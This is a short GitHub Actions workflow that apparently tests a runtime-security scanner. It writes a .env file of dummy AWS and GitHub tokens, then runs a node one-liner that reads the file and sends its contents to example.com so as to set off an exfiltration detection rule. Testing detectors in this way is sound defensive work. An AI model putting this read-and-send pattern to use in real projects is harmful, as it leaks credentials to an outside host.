name: kayo free test
on: { workflow_dispatch: {} }
jobs:
  kayo-free:
    runs-on: ubuntu-latest
    permissions: { contents: read }
    steps:
      - uses: actions/checkout@v4
      - uses: o3security/secure-ci@v1
        with:
          runtime_security: "true"
      - name: warm up then trigger a real workload detection
        run: |
          sleep 40   # let probes attach
          # a node process (not the runner) reading a secret file -> exfil rule
          printf 'AWS_SECRET=AKIAIOSFODNN7EXAMPLE\nTOKEN=ghp_xxxxxxxxxxxxxxxxxxxx\n' > .env
          node -e "const fs=require('fs'); const s=fs.readFileSync('.env','utf8'); require('https').get('https://example.com/?'+encodeURIComponent(s).slice(0,20), r=>r.resume()).on('error',()=>{});"
          sleep 15
